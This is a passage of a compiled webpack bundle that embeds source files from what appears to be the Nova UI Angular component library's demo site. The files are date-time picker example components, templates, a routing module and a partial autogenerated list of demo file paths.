OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl, Validators } from "@angular/forms";\nimport moment from "moment-timezone";\n\nimport { ISelectChangedEvent } from "@nova-ui/bits";\n\nconst zonesData = require("moment-timezone/data/packed/latest.json");\nmoment.tz.add(zonesData.zones);\n\n@Component({\n    selector: "nui-date-time-picker-timezones-example",\n    templateUrl: "./date-time-picker-timezones.example.component.html",\n})\nexport class DateTimePickerTimezonesExampleComponent {\n    public control = new FormControl(moment(), {\n        validators: Validators.required,\n        nonNullable: true,\n    });\n    public zones: string[] = zonesData.zones.map(\n        (z: string) => z.split("|")[0]\n    );\n    public displayedZones = this.zones;\n    public initialZone = "Australia/Sydney";\n\n    get selectedDate(): string {\n        return this.control.value.toString();\n    }\n\n    constructor() {\n        this.control.setValue(this.control.value.tz(this.initialZone));\n    }\n\n    public textboxChanged(searchQuery: ISelectChangedEvent<any>): void {\n        const val = searchQuery.newValue;\n        this.displayedZones = this.zones.filter((z) =>\n            z.toLowerCase().includes(val.toLowerCase())\n        );\n\n        if (this.zones.find((z) => z === val)) {\n            this.control.setValue(this.control.value.tz(val));\n        }\n    }\n}\n'},1186:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h2>Basic</h2>\n            <nui-date-time-picker\n                [model]="dt"\n                id="nui-basic-date-time-picker"\n            ></nui-date-time-picker>\n            <hr />\n        </div>\n        <div class="col">\n            <h2>Range</h2>\n            <nui-date-time-picker\n                [model]="dt"\n                [minDate]="minDate"\n                [maxDate]="maxDate"\n                id="nui-date-time-picker-ranged"\n            ></nui-date-time-picker>\n            <hr />\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h2>Disabled</h2>\n            <nui-date-time-picker\n                [model]="dt"\n                [isDisabled]="true"\n                id="nui-date-time-picker-disabled"\n            ></nui-date-time-picker>\n            <hr />\n        </div>\n        <div class="col">\n            <h2>Inline</h2>\n            <nui-date-time-picker\n                displayMode="inline"\n                [model]="dt"\n                id="nui-date-time-picker-inline"\n            ></nui-date-time-picker>\n            <hr />\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <ng-template #content let-close="close" let-dismiss="dismiss">\n                <nui-dialog-header\n                    title="Dialog title"\n                    i18n-title\n                    (closed)="close()"\n                ></nui-dialog-header>\n                <div class="dialog-body responsive-mode">\n                    <section class="demo-options-section">\n                        <nui-date-time-picker\n                            displayMode="inline"\n                            [model]="dt"\n                            [appendToBody]="true"\n                            id="nui-date-time-picker-dialog"\n                        ></nui-date-time-picker>\n                    </section>\n                </div>\n                <nui-dialog-footer>\n                    <button nui-button type="button" (click)="close()" i18n>\n                        Close\n                    </button>\n                </nui-dialog-footer>\n            </ng-template>\n\n            <button\n                id="nui-visual-test-dialog-btn"\n                nui-button\n                type="button"\n                (click)="open(content)"\n                i18n\n            >\n                Open dialog\n            </button>\n        </div>\n    </div>\n</div>\n'},36638:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef } from "@angular/core";\nimport moment, { Moment } from "moment/moment";\n\nimport { DialogService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-date-time-picker-visual-test",\n    templateUrl: "./date-time-picker-visual-test.component.html",\n})\nexport class DateTimePickerVisualTestComponent {\n    public dt: Moment = moment("2018-02-02");\n    public minDate: Moment = this.dt.clone().date(1);\n    public maxDate: Moment = this.dt.clone().date(20);\n\n    constructor(@Inject(DialogService) private dialogService: DialogService) {}\n\n    public open(content: TemplateRef<string>): void {\n        this.dialogService.open(content, { size: "sm" });\n    }\n}\n'},17787:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDateTimePickerModule,\n    NuiDialogModule,\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiMessageModule,\n    NuiSelectModule,\n    NuiValidationMessageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    DateTimePickerBasicExampleComponent,\n    DateTimePickerDialogExampleComponent,\n    DateTimePickerDisabledExampleComponent,\n    DateTimePickerDocsComponent,\n    DateTimePickerEmptyStateComponent,\n    DateTimePickerInlineExampleComponent,\n    DateTimePickerRangeValuesExampleComponent,\n    DateTimePickerReactiveFormExampleComponent,\n    DateTimePickerTestComponent,\n    DateTimePickerTimezonesExampleComponent,\n    DateTimePickerVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: DateTimePickerDocsComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "date-time-picker-test",\n        component: DateTimePickerTestComponent,\n    },\n    {\n        path: "date-time-picker-visual-test",\n        component: DateTimePickerVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "dialog",\n        component: DateTimePickerDialogExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiDateTimePickerModule,\n        NuiDialogModule,\n        NuiFormFieldModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiSelectModule,\n        NuiValidationMessageModule,\n        NuiMessageModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n        NuiDialogModule,\n    ],\n    declarations: [\n        DateTimePickerTestComponent,\n        DateTimePickerBasicExampleComponent,\n        DateTimePickerInlineExampleComponent,\n        DateTimePickerDisabledExampleComponent,\n        DateTimePickerRangeValuesExampleComponent,\n        DateTimePickerVisualTestComponent,\n        DateTimePickerDocsComponent,\n        DateTimePickerReactiveFormExampleComponent,\n        DateTimePickerEmptyStateComponent,\n        DateTimePickerTimezonesExampleComponent,\n        DateTimePickerDialogExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("date-time-picker"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class DateTimePickerModule {}\n'},61976:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./date-time-picker-basic/date-time-picker-basic.example.component";\nexport * from "./date-time-picker-empty-state/date-time-picker-empty-state.component";\nexport * from "./date-time-picker-docs/date-time-picker-docs.example.component";\nexport * from "./date-time-picker-test/date-time-picker-test.component";\nexport * from "./date-time-picker-inline/date-time-picker-inline.example.component";\nexport * from "./date-time-picker-disabled/date-time-picker-disabled.example.component";\nexport * from "./date-time-picker-range-values/date-time-picker-range-values.example.component";\nexport * from "./date-time-picker-visual-test/date-time-picker-visual-test.component";\nexport * from "./date-time-picker-reactive-form/date-time-picker-reactive-form.example.component";\nexport * from "./date-time-picker-timezones/date-time-picker-timezones.example.component";\nexport * from "./date-time-picker-dialog/date-time-picker-dialog.example.component";\n'},66554:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// this file autogenerated, do not edit it manually please run the script\n// yarn run compile-demo-paths\nexport const DEMO_PATHS = [\n    "breadcrumb/breadcrumb-basic/breadcrumb-basic.example.component.html",\n    "breadcrumb/breadcrumb-basic/breadcrumb-basic.example.component.ts",\n    "breadcrumb/breadcrumb-basic/routes.ts",\n    "breadcrumb/breadcrumb-docs/breadcrumb-docs.example.component.html",\n    "breadcrumb/breadcrumb-docs/breadcrumb-docs.example.component.ts",\n    "breadcrumb/breadcrumb-visual-test/breadcrumb-visual-test.component.html",\n    "breadcrumb/breadcrumb-visual-test/breadcrumb-visual-test.component.ts",\n    "breadcrumb/breadcrumb.module.ts",\n    "breadcrumb/index.ts",\n    "busy/busy-basic/busy-basic.example.component.html",\n    "busy/busy-basic/busy-basic.example.component.less",\n    "busy/busy-basic/busy-basic.example.component.ts",\n    "busy/busy-docs/busy-docs.example.component.html",\n    "busy/busy-docs/busy-docs.example.component.ts",\n    "busy/busy-progress/busy-progress.example.component.html",\n    "busy/busy-progress/busy-progress.example.component.less",\n    "busy/busy-progress/busy-progress.example.component.ts",\n    "busy/busy-spinner/busy-spinner.example.component.html",\n    "busy/busy-spinner/busy-spinner.example.component.less",\n    "busy/busy-spinner/busy-spinner.example.component.ts",\n    "busy/busy-test/busy-test.component.html",\n    "busy/busy-test/busy-test.component.ts",\n    "busy/busy-visual-test/busy-visual-test.component.html",\n    "busy/busy-visual-test/busy-visual-test.component.less",\n    "busy/busy-visual-test/busy-visual-test.component.ts",\n    "busy/busy.module.ts",\n    "busy/index.ts",\n    "button/button-basic/button-basic.example.component.html",\n    "button/button-basic/button-basic.example.component.ts",\n    "button/button-busy/button-busy.example.component.html",\n    "button/button-busy/button-busy.example.component.ts",\n    "button/button-display-style-action/button-display-style-action.example.component.html",\n    "button/button-display-style-action/button-display-style-action.example.component.ts",\n    "button/button-display-style-destructive/button-display-style-destructive.example.component.html",\n    "button/button-display-style-destructive/button-display-style-destructive.example.component.ts",\n    "button/button-display-style-primary/button-display-style-primary.example.component.html",\n    "button/button-display-style-primary/button-display-style-primary.example.component.ts",\n    "button/button-docs/button-docs.example.component.html",\n    "button/button-docs/button-docs.example.component.ts",\n    "button/button-group/button-group.example.component.html",\n    "button/button-group/button-group.example.component.ts",\n    "button/button-long-text/button-with-long-text-example.component.html",\n    "button/button-long-text/button-with-long-text-example.component.ts",\n    "button/button-repeatable/button-repeatable.example.component.html",\n    "button/button-repeatable/button-repeatable.example.component.ts",\n    "button/button-size/button-size.example.component.html",\n    "button/button-size/button-size.example.component.ts",\n    "button/button-test/button-test.component.html",\n    "button/button-test/button-test.component.ts",\n    "button/button-visual-test/button-visual-test.component.html",\n    "button/button-visual-test/button-visual-test.component.ts",\n    "button/button-with-icon/button-with-icon.example.component.html",\n    "button/button-with-icon/button-with-icon.example.component.ts",\n    "button/button-with-icon-custom-color/button-with-icon-custom-color.example.component.html",\n    "button/button-with-icon-custom-color/button-with-icon-custom-color.example.component.ts",\n    "button/button-with-icon-only/button-with-icon-only.example.component.html",\n    "button/button-with-icon-only/button-with-icon-only.example.component.ts",\n    "button/button-with-icon-right/button-with-icon-right.example.component.html",\n    "button/button-with-icon-right/button-with-icon-right.example.component.ts",\n    "button/button.module.ts",\n    "button/index.ts",\n    "checkbox/checkbox-basic/checkbox-basic.example.component.html",\n    "checkbox/checkbox-basic/checkbox-basic.example.component.ts",\n    "checkbox/checkbox-disabled/checkbox-disabled.example.component.html",\n    "checkbox/checkbox-disabled/checkbox-disabled.example.component.ts",\n    "checkbox/checkbox-docs/checkbox-docs.example.component.html",\n    "checkbox/checkbox-docs/checkbox-docs.example.component.ts",\n    "checkbox/checkbox-helphint/checkbox-helphint.example.component.html",\n    "checkbox/checkbox-helphint/checkbox-helphint.example.component.ts",\n    "checkbox/checkbox-in-form/checkbox-in-form.example.component.html",\n    "checkbox/checkbox-in-form/checkbox-in-form.example.component.ts",\n    "checkbox/checkbox-indeterminate/checkbox-indeterminate.example.component.html",\n    "checkbox/checkbox-indeterminate/checkbox-indeterminate.example.component.ts",\n    "checkbox/checkbox-link/checkbox-link.example.component.html",\n    "checkbox/checkbox-link/checkbox-link.example.component.ts",\n    "checkbox/checkbox-output/checkbox-output.example.component.html",\n    "checkbox/checkbox-output/checkbox-output.example.component.ts",\n    "checkbox/checkbox-test/checkbox-test.component.html",\n    "checkbox/checkbox-test/checkbox-test.component.ts",\n    "checkbox/checkbox-visual-test/checkbox-visual-test.component.html",\n    "checkbox/checkbox-visual-test/checkbox-visual-test.component.ts",\n    "checkbox/checkbox.module.ts",\n    "checkbox/index.ts",\n    "checkbox-group/checkbox-group-basic/checkbox-group-basic.example.component.html",\n    "checkbox-group/checkbox-group-basic/checkbox-group-basic.example.component.ts",\n    "checkbox-group/checkbox-group-docs/checkbox-group-docs.example.component.html",\n    "checkbox-group/checkbox-group-docs/checkbox-group-docs.example.component.ts",\n    "checkbox-group/checkbox-group-in-form/checkbox-group-in-form.example.component.html",\n    "checkbox-group/checkbox-group-in-form/checkbox-group-in-form.example.component.ts",\n    "checkbox-group/checkbox-group-inline/checkbox-group-inline.example.component.html",\n    "checkbox-group/checkbox-group-inline/checkbox-group-inline.example.component.ts",\n    "checkbox-group/checkbox-group-justified/checkbox-group-justified.example.component.html",\n    "checkbox-group/checkbox-group-justified/checkbox-group-justified.example.component.ts",\n    "checkbox-group/checkbox-group-test/checkbox-group-test.component.html",\n    "checkbox-group/checkbox-group-test/checkbox-group-test.component.ts",\n    "checkbox-group/checkbox-group-visual-test/checkbox-group-visual-test.component.html",\n    "checkbox-group/checkbox-group-visual-test/checkbox-group-visual-test.component.ts",\n    "checkbox-group/checkbox-group.module.ts",\n    "checkbox-group/index.ts",\n    "chips/autohide-chips/autohide-chips.example.component.html",\n    "chips/autohide-chips/autohide-chips.example.component.ts",\n    "chips/basic-chips/basic-chips.example.component.html",\n    "chips/basic-chips/basic-chips.example.component.ts",\n    "chips/chips-custom-css/chips-custom-css.example.component.html",\n    "chips/chips-custom-css/chips-custom-css.example.component.less",\n    "chips/chips-custom-css/chips-custom-css.example.component.ts",\n    "chips/chips-docs/chips-docs.example.component.html",\n    "chips/chips-docs/chips-docs.example.component.ts",\n    "chips/chips-overflow/chips-overflow.example.component.html",\n    "chips/chips-overflow/chips-overflow.example.component.ts",\n    "chips/chips-test/chips-test.component.html",\n    "chips/chips-test/chips-test.component.ts",\n    "chips/chips-visual-test/chips-visual-test.component.html",\n    "chips/chips-visual-test/chips-visual-test.component.ts",\n    "chips/chips.module.ts",\n    "chips/grouped-chips/grouped-chips.example.component.html",\n    "chips/grouped-chips/grouped-chips.example.component.ts",\n    "chips/index.ts",\n    "chips/vertical-flat-chips/vertical-flat-chips.example.component.html",\n    "chips/vertical-flat-chips/vertical-flat-chips.example.component.ts",\n    "chips/vertical-grouped-chips/vertical-grouped-chips.example.component.html",\n    "chips/vertical-grouped-chips/vertical-grouped-chips.example.component.ts",\n    "combobox/combobox-append-to-body/combobox-append-to-body.example.component.html",\n    "combobox/combobox-append-to-body/combobox-append-to-body.example.component.ts",\n    "combobox/combobox-basic/combobox-basic.example.component.html",\n    "combobox/combobox-basic/combobox-basic.example.component.ts",\n    "combobox/combobox-clear/combobox-clear.example.component.html",\n    "combobox/combobox-clear/combobox-clear.example.component.ts",\n    "combobox/combobox-custom-template/combobox-custom-template.example.component.html",\n    "combobox/combobox-custom-template/combobox-custom-template.example.component.less",\n    "combobox/combobox-custom-template/combobox-custom-template.example.component.ts",\n    "combobox/combobox-disabled/combobox-disabled.example.component.html",\n    "combobox/combobox-disabled/combobox-disabled.example.component.ts",\n    "combobox/combobox-display-value/combobox-display-value.example.component.html",\n    "combobox/combobox-display-value/combobox-display-value.example.component.ts",\n    "combobox/combobox-docs/combobox-docs.example.component.html",\n    "combobox/combobox-docs/combobox-docs.example.component.ts",\n    "combobox/combobox-icon/combobox-icon.example.component.html",\n    "combobox/combobox-icon/combobox-icon.example.component.ts",\n    "combobox/combobox-inline/combobox-inline.example.component.html",\n    "combobox/combobox-inline/combobox-inline.example.component.ts",\n    "combobox/combobox-justified/combobox-justified.example.component.html",\n    "combobox/combobox-justified/combobox-justified.example.component.ts",\n    "combobox/combobox-reactive-form/combobox-reactive-form.example.component.html",\n    "combobox/combobox-reactive-form/combobox-reactive-form.example.component.ts",\n    "combobox/combobox-required/combobox-required.example.component.html",\n    "combobox/combobox-required/combobox-required.example.component.ts",\n    "combobox/combobox-separators/combobox-separators.example.component.html",\n    "combobox/combobox-separators/combobox-separators.example.component.ts",\n    "combobox/combobox-test/combobox-test.component.html",\n    "combobox/combobox-test/combobox-test.component.ts",\n    "combobox/combobox-typeahead/combobox-typeahead.example.component.html",\n    "combobox/combobox-typeahead/combobox-typeahead.example.component.ts",\n    "combobox/combobox-visual-test/combobox-visual-test.component.html",\n    "combobox/combobox-visual-test/combobox-visual-test.component.ts",\n    "combobox/combobox-with-remove-value/combobox-with-remove-value.example.component.html",\n    "combobox/combobox-with-remove-value/combobox-with-remove-value.example.component.ts",\n    "combobox/combobox.module.ts",\n    "combobox/index.ts",\n    "combobox-v2/combobox-v2-basic/combobox-v2-basic.example.component.html",\n    "combobox-v2/combobox-v2-basic/combobox-v2-basic.example.component.ts",\n    "combobox-v2/combobox-v2-create-option/combobox-v2-create-option.example.component.html",\n    "combobox-v2/combobox-v2-create-option/combobox-v2-create-option.example.component.ts",\n    "combobox-v2/combobox-v2-create-option-multiselect/combobox-v2-create-option-multiselect.example.component.html",\n    "combobox-v2/combobox-v2-create-option-multiselect/combobox-v2-create-option-multiselect.example.component.less",\n    "combobox-v2/combobox-v2-create-option-multiselect/combobox-v2-create-option-multiselect.example.component.ts",\n    "combobox-v2/combobox-v2-custom-control/combobox-v2-custom-control.example.component.html",\n    "combobox-v2/combobox-v2-custom-control/combobox-v2-custom-control.example.component.less",\n    "combobox-v2/combobox-v2-custom-control/combobox-v2-custom-control.example.component.ts",\n    "combobox-v2/combobox-v2-custom-typeahead/combobox-v2-custom-typeahead.example.component.html",\n    "combobox-v2/combobox-v2-custom-typeahead/combobox-v2-custom-typeahead.example.component.ts",\n    "combobox-v2/combobox-v2-customize-options/combobox-v2-customize-options.example.component.html",\n    "combobox-v2/combobox-v2-customize-options/combobox-v2-customize-options.example.component.ts",\n    "combobox-v2/combobox-v2-disabled/combobox-v2-disabled.example.component.html",\n    "combobox-v2/combobox-v2-disabled/combobox-v2-disabled.example.component.ts",\n    "combobox-v2/combobox-v2-docs/combobox-v2-docs.example.component.html",\n    "combobox-v2/combobox-v2-docs/combobox-v2-docs.example.component.less",\n    "combobox-v2/combobox-v2-docs/combobox-v2-docs.example.component.ts",\n    "combobox-v2/combobox-v2-error/combobox-v2-error.example.component.html",\n    "combobox-v2/combobox-v2-error/combobox-v2-error.example.component.ts",\n    "combobox-v2/combobox-v2-getting-value/combobox-v2-getting-value.example.component.html",\n    "combobox-v2/combobox-v2-getting-value/combobox-v2-getting-value.example.component.ts",\n    "combobox-v2/combobox-v2-grouped-options/combobox-v2-grouped-options.example.component.html",\n    "combobox-v2/combobox-v2-grouped-options/combobox-v2-grouped-options.example.component.ts",\n    "combobox-v2/combobox-v2-inline/combobox-v2-inline.example.component.html",\n    "combobox-v2/combobox-v2-inline/combobox-v2-inline.example.component.ts",\n    "combobox-v2/combobox-v2-multiselect/combobox-v2-multiselect.example.component.html",\n    "combobox-v2/combobox-v2-multiselect/combobox-v2-multiselect.example.component.less",\n    "combobox-v2/combobox-v2-multiselect/combobox-v2-multiselect.example.component.ts",\n    "combobox-v2/combobox-v2-options-changed/combobox-v2-options-changed.example.component.html",\n    "combobox-v2/combobox-v2-options-changed/combobox-v2-options-changed.example.component.ts",\n    "combobox-v2/combobox-v2-overlay-config/combobox-v2-overlay-config.example.component.html",\n    "combobox-v2/combobox-v2-overlay-config/combobox-v2-overlay-config.example.component.ts",\n    "combobox-v2/combobox-v2-reactive-form-field/combobox-v2-reactive-form-field.example.component.html",\n    "combobox-v2/combobox-v2-reactive-form-field/combobox-v2-reactive-form-field.example.component.ts",\n    "combobox-v2/combobox-v2-remove-value/combobox-v2-remove-value.example.component.html",\n    "combobox-v2/combobox-v2-remove-value/combobox-v2-remove-value.example.component.ts",\n    "combobox-v2/combobox-v2-setting-value/combobox-v2-setting-value.example.component.html",\n    "combobox-v2/combobox-v2-setting-value/combobox-v2-setting-value.example.component.ts",\n    "combobox-v2/combobox-v2-styling/combobox-v2-styling.example.component.html",\n    "combobox-v2/combobox-v2-styling/combobox-v2-styling.example.component.less",\n    "combobox-v2/combobox-v2-styling/combobox-v2-styling.example.component.ts",\n    "combobox-v2/combobox-v2-test/combobox-v2-test.example.component.html",\n    "combobox-v2/combobox-v2-test/combobox-v2-test.example.component.less",\n    "combobox-v2/combobox-v2-test/combobox-v2-test.example.component.ts",\n    "combobox-v2/combobox-v2-typeahead/combobox-v2-typeahead.example.component.html",\n    "combobox-v2/combobox-v2-typeahead/combobox-v2-typeahead.example.component.ts",\n    "combobox-v2/combobox-v2-virtual-scroll/combobox-v2-virtual-scroll.example.component.html",\n    "combobox-v2/combobox-v2-virtual-scroll/combobox-v2-virtual-scroll.example.component.ts",\n    "combobox-v2/combobox-v2.module.ts",\n    "combobox-v2/index.ts",\n    "common/badge/badge-color-black/badge-color-black.component.html",\n    "common/badge/badge-color-black/badge-color-black.component.less",\n    "common/badge/badge-color-black/badge-color-black.component.ts",\n    "common/badge/badge-counter-basic/badge-counter-basic.component.html",\n    "common/badge/badge-counter-basic/badge-counter-basic.component.less",\n    "common/badge/badge-counter-basic/badge-counter-basic.component.ts",\n    "common/badge/badge-customization/badge-customization.component.html",\n    "common/badge/badge-customization/badge-customization.component.less",\n    "common/badge/badge-customization/badge-customization.component.ts",\n    "common/badge/badge-docs/badge-docs.component.html",\n    "common/badge/badge-docs/badge-docs.component.less",\n    "common/badge/badge-docs/badge-docs.component.ts",\n    "common/badge/badge-empty-basic/badge-empty-basic.component.html",\n    "common/badge/badge-empty-basic/badge-empty-basic.component.less",\n    "common/badge/badge-empty-basic/badge-empty-basic.component.ts",\n    "common/badge/badge-novaui/badge-novaui.component.html",\n    "common/badge/badge-novaui/badge-novaui.component.less",\n    "common/badge/badge-novaui/badge-novaui.component.ts",\n    "common/badge/badge-system-statuses/badge-system-statuses.component.html",\n    "common/badge/badge-system-statuses/badge-system-statuses.component.less",\n    "common/badge/badge-system-statuses/badge-system-statuses.component.ts",\n    "common/badge/badge-visual-test/badge-visual-test.component.html",\n    "common/badge/badge-visual-test/badge-visual-test.component.less",\n    "common/badge/badge-visual-test/badge-visual-test.component.ts",\n    "common/badge/badge.module.ts",\n    "common/badge/index.ts",\n    "common/clipboard/clipboard.example.component.html",\n    "common/clipboard/clipboard.example.component.ts",\n    "common/common.module.ts",\n    "common/data-filter/data-filter-basic/data-filter-basic.example.component.html",\n    "common/data-filter/data-filter-basic/data-filter-basic.example.component.ts",\n    "common/data-filter/data-filter-basic/mocked-data.ts",\n    "common/data-filter/data-filter-docs/data-filter-docs.example.component.html",\n    "common/data-filter/data-filter-docs/data-filter-docs.example.component.ts",\n    "common/data-filter/data-filter-isolated/data-filter-isolated.example.component.html",\n    "common/data-filter/data-filter-isolated/data-filter-isolated.example.component.ts",\n    "common/data-filter/data-filter-test/data-filter-test.component.html",\n    "common/data-filter/data-filter-test/data-filter-test.component.ts",\n    "common/data-filter/index.ts",\n    "common/data-source/client-side/client-side-basic/client-side-basic.example.component.html",\n    "common/data-source/client-side/client-side-basic/client-side-basic.example.component.ts",\n    "common/data-source/client-side/client-side-custom-search/client-side-custom-search.example.component.html",\n    "common/data-source/client-side/client-side-custom-search/client-side-custom-search.example.component.ts",\n    "common/data-source/client-side/client-side-delayed/client-side-delayed.example.component.html",\n    "common/data-source/client-side/client-side-delayed/client-side-delayed.example.component.ts",\n    "common/data-source/client-side/client-side-filtering/client-side-filtering.example.component.html",\n    "common/data-source/client-side/client-side-filtering/client-side-filtering.example.component.less",\n    "common/data-source/client-side/client-side-filtering/client-side-filtering.example.component.ts",\n    "common/data-source/client-side/client-side-with-selection/client-side-with-selection.example.component.html",\n    "common/data-source/client-side/client-side-with-selection/client-side-with-selection.example.component.ts",\n    "common/data-source/client-side/docs/client-side-data-source-docs.example.component.html",\n    "common/data-source/client-side/docs/client-side-data-source-docs.example.component.ts",\n    "common/data-source/data-source.module.ts",\n    "common/data-source/deprecated-client-side/client-side-basic/client-side-basic.example.component.html",\n    "common/data-source/deprecated-client-side/client-side-basic/client-side-basic.example.component.ts",\n    "common/data-source/deprecated-client-side/client-side-custom-search/client-side-custom-search.example.component.html",\n    "common/data-source/deprecated-client-side/client-side-custom-search/client-side-custom-search.example.component.ts",\n    "common/data-source/deprecated-client-side/client-side-delayed/client-side-delayed.example.component.html",\n    "common/data-source/deprecated-client-side/client-side-delayed/client-side-delayed.example.component.ts",\n    "common/data-source/deprecated-client-side/client-side-filtering/client-side-filtering.example.component.html",\n    "common/data-source/deprecated-client-side/client-side-filtering/client-side-filtering.example.component.less",\n    "common/data-source/deprecated-client-side/client-side-filtering/client-side-filtering.example.component.ts",\n    "common/data-source/deprecated-client-side/client-side-with-selection/client-side-with-selection.example.component.html",\n    "common/data-source/deprecated-client-side/client-side-with-selection/client-side-with-selection.example.component.ts",\n    "common/data-source/deprecated-client-side/docs/data-source-docs.example.component.html",\n    "common/data-source/deprecated-client-side/docs/data-source-docs.example.component.ts",\n    "common/data-source/index.ts",\n    "common/edge-detection-service/edge-detection-service.example.component.html",\n    "common/edge-detection-service/edge-detection-service.example.component.less",\n    "common/edge-detection-service/edge-detection-service.example.component.ts",\n    "common/event-propagation-service/event-propagation-service.example.component.html",\n    "common/event-propagation-service/event-propagation-service.example.component.ts",\n    "common/index.ts",\n    "common/scroll-shadows/scroll-shadows.example.component.html",\n    "common/scroll-shadows/scroll-shadows.example.component.ts",\n    "common/search-service/search-service.example.component.html",\n    "common/search-service/search-service.example.component.ts",\n    "common/set-focus/set-focus.example.component.html",\n    "common/set-focus/set-focus.example.component.ts",\n    "common/tag/index.ts",\n    "common/tag/tag-basic/tag-basic.example.component.html",\n    "common/tag/tag-basic/tag-basic.example.component.ts",\n    "common/tag/tag-border-color/tag-border-color.example.component.html",\n    "common/tag/tag-border-color/tag-border-color.example.component.ts",\n    "common/tag/tag-color/tag-color.example.component.html",\n    "common/tag/tag-color/tag-color.example.component.less",\n    "common/tag/tag-color/tag-color.example.component.ts",\n    "common/tag/tag-docs/tag-docs.example.component.html",\n    "common/tag/tag-docs/tag-docs.example.component.ts",\n    "common/tag/tag-with-hover/tag-with-hover.example.component.html",\n    "common/tag/tag-with-hover/tag-with-hover.example.component.less",\n    "common/tag/tag-with-hover/tag-with-hover.example.component.ts",\n    "common/tag/tag-with-icon/tag-with-icon.example.component.html",\n    